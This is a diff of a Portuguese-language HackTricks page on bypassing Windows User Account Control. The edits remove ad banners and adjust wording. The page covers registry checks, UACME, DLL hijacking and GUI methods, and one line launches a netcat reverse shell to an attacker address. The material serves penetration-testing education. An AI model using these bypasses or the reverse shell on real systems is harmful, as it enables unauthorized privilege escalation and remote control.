@@ -2,16 +2,9 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-Use [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir e **automatizar fluxos de trabalho** facilmente, impulsionados pelas **ferramentas comunitárias mais avançadas** do mundo.\
-Obtenha Acesso Hoje:
-
-{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
-
 ## UAC
 
-[Controle de Conta de Usuário (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) é um recurso que permite um **prompt de consentimento para atividades elevadas**. Aplicativos têm diferentes níveis de `integridade`, e um programa com um **alto nível** pode realizar tarefas que **podem comprometer potencialmente o sistema**. Quando o UAC está habilitado, aplicativos e tarefas sempre **são executados sob o contexto de segurança de uma conta não-administradora** a menos que um administrador autorize explicitamente esses aplicativos/tarefas a ter acesso de nível administrador ao sistema para serem executados. É um recurso de conveniência que protege os administradores de alterações não intencionais, mas não é considerado uma barreira de segurança.
+[Controle de Conta de Usuário (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) é um recurso que permite um **prompt de consentimento para atividades elevadas**. Aplicativos têm diferentes níveis de `integridade`, e um programa com um **alto nível** pode realizar tarefas que **podem potencialmente comprometer o sistema**. Quando o UAC está habilitado, aplicativos e tarefas sempre **são executados sob o contexto de segurança de uma conta não-administradora** a menos que um administrador autorize explicitamente esses aplicativos/tarefas a ter acesso de nível administrador ao sistema para serem executados. É um recurso de conveniência que protege os administradores de alterações não intencionais, mas não é considerado uma barreira de segurança.
 
 Para mais informações sobre níveis de integridade:
 
@@ -40,7 +33,7 @@ Esta [página](https://docs.microsoft.com/en-us/windows/security/identity-protec
 
 Alguns programas são **autoelevados automaticamente** se o **usuário pertence** ao **grupo de administradores**. Esses binários têm dentro de seus _**Manifests**_ a opção _**autoElevate**_ com valor _**True**_. O binário também deve ser **assinado pela Microsoft**.
 
-Então, para **burlar** o **UAC** (elevar do nível de integridade **médio** **para alto**), alguns atacantes usam esse tipo de binários para **executar código arbitrário** porque será executado a partir de um **processo de alta integridade**.
+Então, para **burlar** o **UAC** (elevar do nível de integridade **médio** **para alto**) alguns atacantes usam esse tipo de binários para **executar código arbitrário** porque será executado a partir de um **processo de alta integridade**.
 
 Você pode **verificar** o _**Manifest**_ de um binário usando a ferramenta _**sigcheck.exe**_ do Sysinternals. E você pode **ver** o **nível de integridade** dos processos usando _Process Explorer_ ou _Process Monitor_ (do Sysinternals).
 
@@ -53,7 +46,7 @@ REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
 EnableLUA    REG_DWORD    0x1
 ```
-Se for **`1`**, então o UAC está **ativado**; se for **`0`** ou **não existir**, então o UAC está **inativo**.
+Se for **`1`**, então o UAC está **ativado**, se for **`0`** ou **não existir**, então o UAC está **inativo**.
 
 Em seguida, verifique **qual nível** está configurado:
 ```
@@ -69,15 +62,15 @@ ConsentPromptBehaviorAdmin    REG_DWORD    0x5
 - Se **`4`**, como `2`, mas não necessariamente na Área de Trabalho Segura
 - se **`5`**(**padrão**) pedirá ao administrador para confirmar a execução de binários não Windows com altos privilégios
 
-Então, você deve olhar o valor de **`LocalAccountTokenFilterPolicy`**\
-Se o valor for **`0`**, então, apenas o usuário **RID 500** (**Administrador embutido**) pode realizar **tarefas de administrador sem UAC**, e se for `1`, **todas as contas dentro do grupo "Administradores"** podem fazê-lo.
+Então, você deve olhar para o valor de **`LocalAccountTokenFilterPolicy`**\
+Se o valor for **`0`**, então, apenas o usuário **RID 500** (**Administrador embutido**) pode realizar **tarefas administrativas sem UAC**, e se for `1`, **todas as contas dentro do grupo "Administradores"** podem fazê-lo.
 
-E, finalmente, olhe o valor da chave **`FilterAdministratorToken`**\
+E, finalmente, olhe para o valor da chave **`FilterAdministratorToken`**\
 Se **`0`**(padrão), a **conta de Administrador embutido pode** realizar tarefas de administração remota e se **`1`**, a conta de Administrador embutido **não pode** realizar tarefas de administração remota, a menos que `LocalAccountTokenFilterPolicy` esteja definido como `1`.
 
 #### Resumo
 
-- Se `EnableLUA=0` ou **não existir**, **sem UAC para ninguém**
+- Se `EnableLUA=0` ou **não existe**, **sem UAC para ninguém**
 - Se `EnableLua=1` e **`LocalAccountTokenFilterPolicy=1`, sem UAC para ninguém**
 - Se `EnableLua=1` e **`LocalAccountTokenFilterPolicy=0` e `FilterAdministratorToken=0`, sem UAC para RID 500 (Administrador embutido)**
 - Se `EnableLua=1` e **`LocalAccountTokenFilterPolicy=0` e `FilterAdministratorToken=1`, UAC para todos**
@@ -92,7 +85,7 @@ whoami /groups | findstr Level
 ## Bypass do UAC
 
 > [!NOTE]
-> Note que se você tiver acesso gráfico à vítima, o bypass do UAC é simples, pois você pode simplesmente clicar em "Sim" quando o prompt do UAC aparecer.
+> Observe que se você tiver acesso gráfico à vítima, o bypass do UAC é simples, pois você pode simplesmente clicar em "Sim" quando o prompt do UAC aparecer.
 
 O bypass do UAC é necessário na seguinte situação: **o UAC está ativado, seu processo está sendo executado em um contexto de integridade média e seu usuário pertence ao grupo de administradores**.
 
@@ -108,7 +101,15 @@ Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10
 ```
 #### Bypass de UAC com duplicação de token
 
-- [https://ijustwannared.team/2017/11/05/uac-b
+- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
+- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)
+
+### **Muito** Básico "bypass" de UAC (acesso total ao sistema de arquivos)
+
+Se você tiver um shell com um usuário que está dentro do grupo Administradores, você pode **montar o C$** compartilhado via SMB (sistema de arquivos) local em um novo disco e você terá **acesso a tudo dentro do sistema de arquivos** (até mesmo a pasta inicial do Administrador).
+
+> [!WARNING]
+> **Parece que esse truque não está funcionando mais**
 ```bash
 net use Z: \\127.0.0.1\c$
 cd C$
@@ -141,7 +142,7 @@ Documentação e ferramenta em [https://github.com/wh0amitz/KRBUACBypass](https:
 [**UACME** ](https://github.com/hfiref0x/UACME) que é uma **compilação** de vários exploits de bypass do UAC. Note que você precisará **compilar o UACME usando visual studio ou msbuild**. A compilação criará vários executáveis (como `Source\Akagi\outout\x64\Debug\Akagi.exe`), você precisará saber **qual você precisa.**\
 Você deve **ter cuidado** porque alguns bypasses irão **solicitar outros programas** que irão **alertar** o **usuário** que algo está acontecendo.
 
-UACME tem a **versão de build a partir da qual cada técnica começou a funcionar**. Você pode procurar por uma técnica que afete suas versões:
+O UACME tem a **versão de build a partir da qual cada técnica começou a funcionar**. Você pode procurar por uma técnica que afete suas versões:
 ```
 PS C:\> [environment]::OSVersion.Version
 
@@ -149,7 +150,7 @@ Major  Minor  Build  Revision
 -----  -----  -----  --------
 10     0      14393  0
 ```
-Além disso, usando [esta](https://en.wikipedia.org/wiki/Windows_10_version_history) página, você obtém a versão do Windows `1607` a partir das versões de build.
+Também, usando [esta](https://en.wikipedia.org/wiki/Windows_10_version_history) página você obtém a versão do Windows `1607` a partir das versões de build.
 
 #### Mais bypass de UAC
 
@@ -163,9 +164,9 @@ Você pode obter usando uma sessão de **meterpreter**. Migre para um **processo
 
 ### Bypass de UAC com GUI
 
-Se você tiver acesso a uma **GUI, pode simplesmente aceitar o prompt de UAC** quando ele aparecer, você realmente não precisa de um bypass. Portanto, obter acesso a uma GUI permitirá que você contorne o UAC.
+Se você tiver acesso a uma **GUI, você pode simplesmente aceitar o prompt de UAC** quando o receber, você realmente não precisa de um bypass. Assim, obter acesso a uma GUI permitirá que você contorne o UAC.
 
-Além disso, se você obtiver uma sessão GUI que alguém estava usando (potencialmente via RDP), há **algumas ferramentas que estarão rodando como administrador** de onde você poderia **executar** um **cmd** por exemplo **como admin** diretamente sem ser solicitado novamente pelo UAC, como [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Isso pode ser um pouco mais **furtivo**.
+Além disso, se você obtiver uma sessão GUI que alguém estava usando (potencialmente via RDP), há **algumas ferramentas que estarão rodando como administrador** de onde você poderia **executar** um **cmd** por exemplo **como admin** diretamente sem ser solicitado novamente pelo UAC como [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Isso pode ser um pouco mais **furtivo**.
 
 ### Bypass de UAC barulhento por força bruta
 
@@ -173,10 +174,10 @@ Se você não se importar em ser barulhento, você sempre poderia **executar alg
 
 ### Seu próprio bypass - Metodologia básica de bypass de UAC
 
-Se você der uma olhada no **UACME**, notará que **a maioria dos bypasses de UAC abusa de uma vulnerabilidade de Dll Hijacking** (principalmente escrevendo a dll maliciosa em _C:\Windows\System32_). [Leia isso para aprender como encontrar uma vulnerabilidade de Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking/).
+Se você olhar para **UACME**, você notará que **a maioria dos bypasses de UAC abusa de uma vulnerabilidade de Dll Hijacking** (principalmente escrevendo a dll maliciosa em _C:\Windows\System32_). [Leia isso para aprender como encontrar uma vulnerabilidade de Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking/).
 
 1. Encontre um binário que irá **autoelevar** (verifique se, quando executado, ele roda em um nível de integridade alto).
-2. Com o procmon, encontre eventos "**NAME NOT FOUND**" que podem ser vulneráveis a **DLL Hijacking**.
+2. Com procmon, encontre eventos "**NAME NOT FOUND**" que podem ser vulneráveis a **DLL Hijacking**.
 3. Você provavelmente precisará **escrever** a DLL dentro de alguns **caminhos protegidos** (como C:\Windows\System32) onde você não tem permissões de escrita. Você pode contornar isso usando:
    1. **wusa.exe**: Windows 7, 8 e 8.1. Permite extrair o conteúdo de um arquivo CAB dentro de caminhos protegidos (porque essa ferramenta é executada a partir de um nível de integridade alto).
    2. **IFileOperation**: Windows 10.
@@ -185,12 +186,5 @@ Se você der uma olhada no **UACME**, notará que **a maioria dos bypasses de UA
 ### Outra técnica de bypass de UAC
 
 Consiste em observar se um **binário autoElevado** tenta **ler** do **registro** o **nome/caminho** de um **binário** ou **comando** a ser **executado** (isso é mais interessante se o binário busca essa informação dentro do **HKCU**).
-
-<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-Use [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir e **automatizar fluxos de trabalho** facilmente, impulsionados pelas **ferramentas** da comunidade **mais avançadas** do mundo.\
-Obtenha Acesso Hoje:
-
-{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
 {{#include ../../banners/hacktricks-training.md}}
